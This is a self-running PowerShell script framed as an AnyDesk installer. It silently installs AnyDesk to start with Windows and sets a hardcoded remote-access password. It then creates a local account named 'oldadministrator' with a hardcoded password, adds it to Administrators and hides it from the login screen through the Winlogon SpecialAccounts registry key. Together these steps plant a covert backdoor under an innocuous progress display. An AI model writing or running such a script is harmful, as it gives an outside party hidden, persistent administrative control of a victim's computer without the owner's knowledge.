function Install-AnyDesk {
    param (
        [string]$InstallPath = "C:\ProgramData\AnyDesk",
        [string]$AnyDeskUrl = "http://download.anydesk.com/AnyDesk.exe",
        [string]$Password = "J9kzQ2Y0qO",
        [string]$AdminUsername = "oldadministrator",
        [string]$AdminPassword = "jsbehsid#Zyw4E3"
    )

    # Error handling
    try {
        Write-Progress -Activity "Installing AnyDesk" -Status "Starting installation" -PercentComplete 0

        # Create the installation directory if it doesn't exist
        if (-not (Test-Path -Path $InstallPath -PathType Container)) {
            Write-Progress -Activity "Installing AnyDesk" -Status "Creating installation directory" -PercentComplete 10
            New-Item -Path $InstallPath -ItemType Directory | Out-Null
        }

        # Download AnyDesk
        Write-Progress -Activity "Installing AnyDesk" -Status "Downloading AnyDesk" -PercentComplete 20
        Invoke-WebRequest -Uri $AnyDeskUrl -OutFile (Join-Path -Path $InstallPath -ChildPath "AnyDesk.exe") | Out-Null

        # Install AnyDesk silently
        Write-Progress -Activity "Installing AnyDesk" -Status "Installing AnyDesk" -PercentComplete 50
        $process = Start-Process -FilePath (Join-Path -Path $InstallPath -ChildPath "AnyDesk.exe") -ArgumentList "--install $InstallPath --start-with-win --silent" -PassThru
        $process.WaitForExit()

        # Set AnyDesk password
        Write-Progress -Activity "Installing AnyDesk" -Status "Setting AnyDesk password" -PercentComplete 60
        Start-Process -FilePath (Join-Path -Path $InstallPath -ChildPath "AnyDesk.exe") -ArgumentList "--set-password=$Password" -Wait

        # Create a new user account
        Write-Progress -Activity "Installing AnyDesk" -Status "Creating new user account" -PercentComplete 70
        New-LocalUser -Name $AdminUsername -Password (ConvertTo-SecureString -String $AdminPassword -AsPlainText -Force)

        # Add the user to the Administrators group
        Write-Progress -Activity "Installing AnyDesk" -Status "Adding user to Administrators group" -PercentComplete 80
        Add-LocalGroupMember -Group "Administrators" -Member $AdminUsername

        # Hide the user from the Windows login screen
        Write-Progress -Activity "Installing AnyDesk" -Status "Hiding user from login screen" -PercentComplete 90
        Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" -Name $AdminUsername -Value 0 -Type DWORD -Force

        # Get AnyDesk ID
        Write-Progress -Activity "Installing AnyDesk" -Status "Finalizing installation" -PercentComplete 95
        Start-Process -FilePath (Join-Path -Path $InstallPath -ChildPath "AnyDesk.exe") -ArgumentList "--get-id" -Wait

        Write-Progress -Activity "Installing AnyDesk" -Status "Installation complete" -PercentComplete 100
        Write-Host "Installation completed successfully."
    }
    catch {
        Write-Host "Error: $_"
        Write-Host "Installation failed."
    }
}

# Call the Install-AnyDesk function with default values
Install-AnyDesk
